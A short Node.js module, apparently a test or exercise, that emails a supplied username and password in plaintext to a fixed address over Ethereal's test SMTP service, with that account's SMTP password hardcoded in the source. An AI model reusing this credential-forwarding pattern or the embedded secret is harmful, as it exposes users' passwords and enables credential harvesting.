const nodemailer = require('nodemailer');

module.exports = {
    sendMail : async (uname, password) => {

        const transporter = nodemailer.createTransport({
            host: 'smtp.ethereal.email',
            port: 587,
            auth: {
                user: 'karl.hudson12@ethereal.email',
                pass: 'jDwNtbq7Pr3fGDmCS9'
            }
        });

        let info = await transporter.sendMail({
            from: '"Our application" <ourapp@mail.com>',
            to: 'karl.hudson12@ethereal.email',
            subject: "Credentials",
            text: "User: " + uname + " Password: " + password
        })
    }
}